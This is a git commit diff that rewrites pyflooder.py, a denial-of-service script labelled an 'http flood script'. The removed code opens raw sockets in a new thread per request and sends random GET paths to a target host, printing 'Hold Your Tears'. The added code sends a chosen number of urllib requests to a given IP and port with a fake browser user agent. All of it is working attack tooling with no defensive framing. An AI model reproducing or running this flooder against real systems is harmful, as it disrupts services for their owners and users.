b15aef7f9a1cf1d2b798c107669497ac84c6ff31
RlyEasy <nazmiev69@gmail.com>
2020-11-18 23:13:40 +0300

    Changed on my way: updated to python3, http requests with urllib, count of packets instead of threads

--- pyflooder.py
+++ pyflooder.py
@@ -1,102 +1,69 @@
-# -*- coding: utf-8 -*-
-# Author : D4Vinci
-# Recoded by : codex31
-# Moved from python2 to python3
-# All copyrights to Squnity team
-
+from argparse import ArgumentParser, Namespace
 import random
-import socket
 import string
 import sys
-import threading
-import time
-
-# Parse inputs
-host = ""
-ip = ""
-port = 0
-num_requests = 0
-
-if len(sys.argv) == 2:
-    port = 80
-    num_requests = 100000000
-elif len(sys.argv) == 3:
-    port = int(sys.argv[2])
-    num_requests = 100000000
-elif len(sys.argv) == 4:
-    port = int(sys.argv[2])
-    num_requests = int(sys.argv[3])
-else:
-    print ("ERROR\n Usage: " + sys.argv[0] + " < Hostname > < Port > < Number_of_Attacks >")
-    sys.exit(1)
-
-# Convert FQDN to IP
-try:
-    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
-    ip = socket.gethostbyname(host)
-except socket.gaierror:
-    print (" ERROR\n Make sure you entered a correct website")
-    sys.exit(2)
-
-# Create a shared variable for thread counts
-thread_num = 0
-thread_num_mutex = threading.Lock()
+from urllib.request import Request, urlopen
 
 
-# Print thread status
-def print_status():
-    global thread_num
-    thread_num_mutex.acquire(True)
-
-    thread_num += 1
-    print ("\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] #-#-# Hold Your Tears #-#-#")
-
-    thread_num_mutex.release()
+def get_random_string(length: int) -> str:
+    """
+    Function previously used to generate random GET parameters.
+    Now it's here for using in future.
+    """
+    letters: str = string.ascii_lowercase
+    return ''.join(random.choice(letters) for i in range(length))
 
 
-# Generate URL Path
-def generate_url_path():
-    msg = str(string.ascii_letters + string.digits + string.punctuation)
-    data = "".join(random.sample(msg, 5))
-    return data
-
-
-# Perform the request
-def attack():
-    print_status()
-    url_path = generate_url_path()
-
-    # Create a raw socket
-    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
+def attack(url: str) -> None:
+    """
+    Send an HTTP POST request to the specified url
+    :param url: http://.../
+    """
     try:
-        # Open the connection on that raw socket
-        dos.connect((ip, port))
-
-        # Send the request according to HTTP spec
-        #dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
-        msg = "GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host)
-        byt = msg.encode()
-        dos.send(byt)
-    except socket.error:
-        print ("\n [ No connection, server may be down ]: " + str(socket.error))
-    finally:
-        # Close our socket gracefully
-        dos.shutdown(socket.SHUT_RDWR)
-        dos.close()
+        headers: dict = {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'}
+        req: Request = Request(url, headers=headers)
+        urlopen(req)
+    except Exception as e:
+        print(e.__repr__())
 
 
-print ("[#] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests))
+def main(options: Namespace) -> None:
+    port: int = options.port
+    url: str = f'http://{options.ip}:{port}/'
+    requests_count: int = options.requests_count
+    if port < 1 or port > 65535:
+        print('Specified invalid target port', file=sys.stderr)
+        sys.exit(1)
+    if requests_count <= 0:
+        print('Specified invalid count of threads', file=sys.stderr)
+        sys.exit(1)
+    for i in range(requests_count):
+        attack(url)
 
-# Spawn a thread per request
-all_threads = []
-for i in range(num_requests):
-    t1 = threading.Thread(target=attack)
-    t1.start()
-    all_threads.append(t1)
 
-    # Adjusting this sleep time will affect requests per second
-    time.sleep(0.01)
+def parse_arguments() -> Namespace:
+    parser = ArgumentParser(description='http flood script')
+    parser.add_argument('-a', '--address',
+                        action='store',
+                        dest='ip',
+                        required=True,
+                        help='destination IPv4 address')
 
-for current_thread in all_threads:
-    current_thread.join()  # Make the main thread wait for the children threads
+    parser.add_argument('-p', '--port',
+                        action='store',
+                        dest='port',
+                        required=True,
+                        type=int,
+                        help='destination port')
+
+    parser.add_argument('-c', '--requests-count',
+                        action='store',
+                        dest='requests_count',
+                        required=True,
+                        type=int,
+                        help='number of requests')
+    return parser.parse_args()
+
+
+if __name__ == '__main__':
+    main(parse_arguments())
